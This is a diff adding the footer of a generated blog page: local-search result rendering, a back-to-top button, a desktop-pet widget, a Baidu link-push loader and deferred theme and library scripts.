+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+    <aside id="linDesktopPet" class="lin-desktop-pet" aria-label="林翩翩桌宠">
+    <div class="lin-pet-bubble" role="status" aria-live="polite">这儿……便是你的住处？</div>
+    <div class="lin-pet-effects" aria-hidden="true"></div>
+    <button class="lin-pet-character" type="button" aria-label="和林翩翩互动" title="点击互动，也可以拖动">
+        <img src="/medias/lin-pianpian/official-desktop-pet.webp" alt="林翩翩桌宠" width="576" height="703" loading="lazy" decoding="async" fetchpriority="low">
+    </button>
+</aside>
+
+<script src="/js/desktop-pet.js?v=20260824-2" defer fetchpriority="low"></script>
+
+
+    <script src="/libs/materialize/materialize.min.js" defer fetchpriority="low"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js" defer fetchpriority="low"></script>
+    <script src="/libs/aos/aos.js" defer fetchpriority="low"></script>
+    
+    <script src="/libs/scrollprogress/scrollProgress.min.js" defer fetchpriority="low"></script>
+    
+    
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js" defer fetchpriority="low"></script>
+    
+    <script src="/js/matery.js?v=20260824-speed1" defer fetchpriority="low"></script>
+
+    <!-- Baidu Analytics -->
+
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        if (/^(localhost|127\.0\.0\.1)$/.test(window.location.hostname)) return;
+
+        function loadBaiduPush() {
+            var bp = document.createElement('script');
+            bp.async = true;
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+            document.head.appendChild(bp);
+        }
+
+        if ('requestIdleCallback' in window) {
+            window.requestIdleCallback(loadBaiduPush, { timeout: 4500 });
+        } else {
+            window.addEventListener('load', function () {
+                window.setTimeout(loadBaiduPush, 1800);
+            }, { once: true });
+        }
+    })();
+</script>
+
+
+    
+    <script>
+        (function () {
+            var optionalScripts = [];
+            
+            optionalScripts.push('/libs/others/clicklove.js');
+            
+            
+            optionalScripts.push('/libs/others/busuanzi.pure.mini.js');
+            
+
+            function loadOptionalScripts() {
+                optionalScripts.forEach(function (src, index) {
+                    window.setTimeout(function () {
+                        var script = document.createElement('script');
+                        script.src = src;
+                        script.async = true;
+                        document.body.appendChild(script);
+                    }, index * 500);
+                });
+            }
+
+            window.addEventListener('load', function () {
+                if ('requestIdleCallback' in window) {
+                    window.requestIdleCallback(loadOptionalScripts, { timeout: 3000 });
+                } else {
+                    window.setTimeout(loadOptionalScripts, 1500);
+                }
+            }, { once: true });
+        })();
+    </script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
